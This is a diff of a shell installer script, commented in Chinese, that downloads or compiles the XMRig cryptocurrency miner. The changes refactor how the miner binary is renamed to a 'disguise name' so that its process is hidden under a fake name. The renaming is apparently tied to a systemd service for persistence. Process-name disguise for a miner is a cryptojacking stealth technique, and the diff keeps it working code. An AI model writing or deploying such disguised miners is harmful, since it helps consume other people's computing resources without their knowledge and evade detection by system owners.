@@ -703,24 +703,21 @@ download_precompiled_binary() {
     rm -f README* 2>/dev/null || true
     rm -f LICENSE* 2>/dev/null || true
     
-    # 获取伪装名称（在重命名前重新获取）
-    local disguise_name=$(get_disguise_name)
-    
     # 进程名称伪装
     log_info "设置进程伪装..."
-    log_info "将xmrig重命名为: $disguise_name"
+    log_info "将xmrig重命名为: $DISGUISE_NAME"
     
-    # 重命名xmrig为伪装名称
-    mv "$FILENAME" "$disguise_name" || {
+    # 重命名xmrig为伪装名称（使用全局变量确保与systemd服务配置一致）
+    mv "$FILENAME" "$DISGUISE_NAME" || {
         log_error "重命名xmrig失败"
         exit 1
     }
     
     # 设置伪装文件的执行权限
-    chmod +x "$disguise_name"
+    chmod +x "$DISGUISE_NAME"
     
     # 创建软链接保持兼容性
-    ln -sf "$disguise_name" xmrig
+    ln -sf "$DISGUISE_NAME" xmrig
 }
 
 # 从源码编译XMRig
@@ -863,30 +860,24 @@ compile_from_source() {
     log_info "清理源码目录..."
     rm -rf "xmrig-${VERSION}"
     
-    # 获取伪装名称
-    local disguise_name=$(get_disguise_name)
-    
     # 设置执行权限
     chmod +x xmrig
     
     # 进程名称伪装
     log_info "设置进程伪装..."
-    log_info "将xmrig重命名为: $disguise_name"
+    log_info "将xmrig重命名为: $DISGUISE_NAME"
     
-    # 重命名xmrig为伪装名称
-    mv xmrig "$disguise_name" || {
+    # 重命名xmrig为伪装名称（使用全局变量确保与systemd服务配置一致）
+    mv xmrig "$DISGUISE_NAME" || {
         log_error "重命名xmrig失败"
         exit 1
     }
     
     # 设置伪装文件的执行权限
-    chmod +x "$disguise_name"
+    chmod +x "$DISGUISE_NAME"
     
     # 创建软链接保持兼容性
-    ln -sf "$disguise_name" xmrig
-    
-    # 更新全局变量
-    DISGUISE_NAME="$disguise_name"
+    ln -sf "$DISGUISE_NAME" xmrig
     
     log_info "XMRig编译和安装完成，进程已伪装为: $DISGUISE_NAME"
 }
